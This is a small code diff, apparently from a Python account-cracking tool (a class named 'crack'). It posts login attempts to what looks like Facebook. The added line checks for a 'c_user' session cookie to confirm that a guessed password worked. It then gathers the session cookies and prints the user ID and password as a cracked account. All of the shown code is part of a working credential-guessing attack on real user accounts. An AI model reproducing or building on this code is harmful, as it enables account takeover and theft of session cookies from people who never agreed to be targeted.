@@ -674,6 +674,7 @@ class crack:
                 }
                 rex = ses.post('https://'+_jat+link.get('action'), data=data, headers=_head2, allow_redirects=False)
                 cok = ses.cookies.get_dict()
+                if "c_user" in str(cok):
                     coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                     user=cok['c_user']
                     print(f"\r{HH}[OK-GSXD] {user} | {pw} {VV}    ")
